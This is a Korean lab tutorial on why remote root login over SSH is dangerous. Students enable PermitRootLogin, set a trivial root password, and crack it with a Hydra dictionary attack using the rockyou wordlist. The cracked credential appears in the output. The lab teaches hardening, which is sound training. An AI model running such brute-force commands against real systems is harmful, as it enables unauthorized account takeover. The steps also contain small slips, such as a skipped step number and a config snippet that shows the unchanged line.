## root 계정 원격접속 제한

`rrot` 계정의 원격 접속을 허용하면 어떤 문제가 발생할 수 있는지 알아봅시다.

### 실습 1 : SSH를 통한 사전 대입 공격
1. [우분투] (필요시) 원격 접속을 위해 OpenSSH 서버 설치
```
cju@wooam:~$ sudo apt install openssh-server
```
2. [우분투] 
```
sudo vi /etc/ssh/sshd_config
```

3. [우분투] `#PermitRootLogin prohibit-password`를 `PermitRootLogin yes`로 변경 후 저장
```
PermitRootLogin prohibit-password
```

4. [우분투] OpenSSH 서버 재시작
```
sudo systemctl restart sshd
```

5. [우분투] `root` 계정 패스워드를 `111111`로 변경(`1`이 6개)
```
cju@wooam:~$ sudo passwd
```

6. [우분투] IP 주소 확인
```
cju@wooam:~$ ip a
```

7. [칼리] Hydra 도구를 사용한 사전 대입 공격
```
$ hydra -l root -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.XXX.xxx
```

8. [칼리] 패스워드가 보인다!
```
[22][ssh] host: 192.168.XXX.XXX   login: root   password: 111111
```

10. [칼리] (참고) 사전 파일 확인
```
$ vi /usr/share/wordlists/rockyou.txt.gz
```